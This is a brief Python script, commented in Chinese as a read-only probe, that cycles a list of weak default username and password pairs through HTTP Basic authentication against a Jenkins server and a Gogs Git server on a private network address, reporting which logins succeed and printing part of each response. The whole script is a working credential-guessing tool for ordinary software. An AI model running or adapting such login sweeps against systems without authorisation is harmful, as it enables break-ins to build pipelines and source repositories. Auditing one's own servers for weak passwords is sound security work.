# -*- coding: utf-8 -*-
"""探测 Jenkins / Gogs 的可用凭据（只做只读探测）"""
import base64
import json
import urllib.error
import urllib.request

JENKINS = "http://192.168.150.101:18080"
GOGS = "http://192.168.150.101:10880"


def get(url, user=None, pwd=None):
    req = urllib.request.Request(url)
    if user:
        token = base64.b64encode(f"{user}:{pwd}".encode()).decode()
        req.add_header("Authorization", "Basic " + token)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception as e:
        return None, str(e)


creds = [
    ("root", "123456"), ("root", "root"), ("root", "admin"),
    ("tjxt", "123456"), ("tjxt", "tjxt"), ("tjxt", "admin"),
    ("admin", "admin"), ("admin", "123456"), ("huyi0612", "123456"),
]

print("=== Jenkins (18080) ===")
for u, p in creds:
    code, body = get(JENKINS + "/api/json?tree=jobs[name]", u, p)
    ok = code == 200
    print(f"  {u}/{p} -> {code} {('JOBS=' + str(body.count('_class'))) if ok else ''}")
    if ok:
        print("    body:", body[:200])

print("\n=== Gogs (10880) ===")
for u, p in creds:
    code, body = get(GOGS + "/api/v1/user", u, p)
    print(f"  {u}/{p} -> {code}")
    if code == 200:
        print("    body:", body[:200])
